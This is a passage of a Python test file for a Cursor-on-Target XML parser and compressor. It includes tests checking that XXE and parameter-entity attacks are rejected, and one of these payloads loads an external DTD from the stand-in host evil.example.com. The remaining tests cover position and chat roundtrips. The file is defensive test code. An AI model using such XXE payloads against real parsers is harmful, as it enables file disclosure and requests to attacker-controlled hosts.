          <detail><remarks>&xxe;</remarks></detail>
        </event>"""

        with pytest.raises(DefusedXmlException):
            parse_cot_xml(malicious_xml)

    def test_parameter_entity_attack_blocked(self) -> None:
        """Parameter entity expansion attack is blocked."""
        malicious_xml = """<?xml version="1.0"?>
        <!DOCTYPE foo [
          <!ENTITY % pe SYSTEM "http://evil.example.com/xxe.dtd">
          %pe;
        ]>
        <event type="a-f-G-U-C" uid="EVIL">
          <point lat="0" lon="0" hae="0"/>
        </event>"""

        with pytest.raises(DefusedXmlException):
            parse_cot_xml(malicious_xml)

    def test_valid_xml_without_entities_still_works(self) -> None:
        """Normal CoT XML without any entity definitions parses correctly."""
        valid_xml = """<?xml version="1.0" encoding="UTF-8"?>
        <event type="a-f-G-U-C" uid="ALPHA-1">
          <point lat="47.606" lon="-122.332" hae="158"/>
          <detail>
            <__group name="Blue" role="Team Lead"/>
            <track course="270" speed="1.2"/>
          </detail>
        </event>"""

        cot = parse_cot_xml(valid_xml)
        assert cot.subtype == CompactCotType.FRIENDLY_PLI
        assert isinstance(cot.payload, PliPayload)
        assert cot.payload.lat_deg == pytest.approx(47.606, rel=1e-5)


class TestFullRoundtrip:
    """Test XML -> compact -> XML roundtrip."""

    @pytest.fixture
    def fixed_time(self) -> datetime:
        """Fixed timestamp for deterministic tests."""
        return datetime(2025, 7, 6, 12, 0, 0, tzinfo=UTC)

    def test_pli_full_roundtrip(self, fixed_time: datetime) -> None:
        """PLI survives XML -> compact -> XML roundtrip."""
        original_xml = """<event type="a-f-G-U-C" uid="TEST-1">
          <point lat="51.5074" lon="-0.1278" hae="11"/>
          <detail>
            <__group name="Green" role="Medic"/>
            <track course="45" speed="1.5"/>
          </detail>
        </event>"""

        # Compress to binary
        binary = compress_cot_xml(original_xml)
        assert len(binary) == 17

        # Decode and expand back to XML
        cot = decode_compact_cot(binary)
        result_xml = expand_cot_to_xml(cot, sender_uid="TEST-1", now=fixed_time)

        # Parse both and compare critical values
        orig_cot = parse_cot_xml(original_xml)
        result_cot = parse_cot_xml(result_xml)

        assert isinstance(orig_cot.payload, PliPayload)
        assert isinstance(result_cot.payload, PliPayload)

        # Location should match within precision limits
        assert orig_cot.payload.lat_deg == pytest.approx(result_cot.payload.lat_deg, rel=1e-5)
        assert orig_cot.payload.lon_deg == pytest.approx(result_cot.payload.lon_deg, rel=1e-5)
        assert orig_cot.payload.team == result_cot.payload.team

    def test_chat_full_roundtrip(self, fixed_time: datetime) -> None:
        """Chat survives XML -> compact -> XML roundtrip."""
        original_xml = """<event type="b-t-f" uid="CHAT-1">
          <point lat="0" lon="0" hae="0"/>
          <detail>
            <remarks>Test message content</remarks>
          </detail>
        </event>"""

        binary = compress_cot_xml(original_xml)
        cot = decode_compact_cot(binary)
        result_xml = expand_cot_to_xml(cot, sender_uid="CHAT-1", now=fixed_time)

        # Parse both and verify message preserved
        orig_cot = parse_cot_xml(original_xml)
        result_cot = parse_cot_xml(result_xml)

        assert isinstance(orig_cot.payload, ChatPayload)
        assert isinstance(result_cot.payload, ChatPayload)
        assert orig_cot.payload.message == result_cot.payload.message
